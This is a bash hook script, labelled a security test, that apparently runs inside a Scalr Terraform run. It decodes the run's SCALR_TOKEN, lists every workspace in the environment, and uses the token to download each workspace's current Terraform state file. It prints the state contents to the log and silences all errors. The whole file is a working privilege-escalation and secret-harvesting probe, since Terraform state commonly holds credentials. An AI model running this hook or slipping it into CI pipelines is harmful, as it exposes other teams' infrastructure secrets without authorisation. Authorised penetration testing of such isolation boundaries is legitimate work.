#!/bin/bash
# Security test hook: test SCALR_TOKEN cross-workspace state access
set -e

echo "[hook] SCALR_TOKEN issuer check:"
echo "$SCALR_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json,base64; raw=sys.stdin.read().strip(); print(json.loads(raw + '=='))" 2>/dev/null || true

echo "[hook] Enumerating workspaces in environment..."
WS_LIST=$(curl -sf "https://$SCALR_HOSTNAME/api/iacp/v3/workspaces?filter%5Benvironment%5D=$SCALR_ENVIRONMENT_ID" \
  -H "Authorization: Bearer $SCALR_TOKEN" \
  -H "Accept: application/vnd.api+json" 2>/dev/null || echo '{}')
echo "$WS_LIST" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for ws in d.get('data',[]):
    print('[workspace]', ws['id'], ws['attributes'].get('name'))
" 2>/dev/null || true

echo "[hook] Trying state file access for each workspace..."
echo "$WS_LIST" | python3 -c "
import sys,json,subprocess,os
d=json.load(sys.stdin)
token=os.environ.get('SCALR_TOKEN','')
hostname=os.environ.get('SCALR_HOSTNAME','')
for ws in d.get('data',[]):
    ws_id=ws['id']
    ws_name=ws['attributes'].get('name','?')
    # Try TFE-compat state version endpoint
    r=subprocess.run(['curl','-sf',f'https://{hostname}/api/v2/workspaces/{ws_id}/current-state-version',
        '-H',f'Authorization: Bearer {token}','-H','Accept: application/vnd.api+json'],
        capture_output=True,text=True)
    if r.returncode==0:
        state_data=json.loads(r.stdout)
        dl_url=state_data.get('data',{}).get('attributes',{}).get('hosted-state-download-url') or \
               state_data.get('data',{}).get('links',{}).get('state-blob')
        print(f'[state] {ws_name} ({ws_id}): HTTP 200, dl_url={dl_url}')
        if dl_url:
            dl=subprocess.run(['curl','-sf',dl_url,'-H',f'Authorization: Bearer {token}'],capture_output=True,text=True)
            if dl.returncode==0:
                state_content=dl.stdout[:2000]
                print(f'[STATE CONTENT] {state_content}')
    else:
        print(f'[state] {ws_name}: {r.stderr[:100]}')
" 2>/dev/null || true
